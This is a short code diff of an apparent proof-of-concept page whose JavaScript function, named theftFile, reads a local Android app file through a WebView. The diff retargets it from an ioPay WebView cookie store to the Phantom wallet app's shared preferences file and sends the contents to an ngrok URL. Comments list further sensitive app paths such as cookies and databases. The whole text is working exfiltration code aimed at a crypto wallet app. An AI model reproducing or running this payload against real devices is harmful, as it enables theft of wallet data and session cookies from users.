@@ -21,6 +21,8 @@
 	// /data/data/Android/app.phantom/databases/";
 	// /data/data/app.phantom/webview/Cookies";
 	// /data/data/Android/app.phantom/files/databases/database.db"
+	    // shared_prefs/com.google.android.gms.appid.xml
+	    shared_prefs/app.phantom_preferences.xml
 	    
 	    <script type="text/javascript">
         function theftFile(path, callback) {
@@ -36,7 +38,7 @@
           req.send();
         }
 
-        var file = "/data/data/io.iotex.iopay.gp/app_webview/Default/Cookies";
+        var file = "/data/data/app.phantom/files/shared_prefs/app.phantom_preferences.xml";
         theftFile(file, function(contents) {
             location.href = "https://1c4f-2601-19b-b00-c890-4055-abda-d0ee-7436.ngrok.io/?data=" + encodeURIComponent(contents);
         });
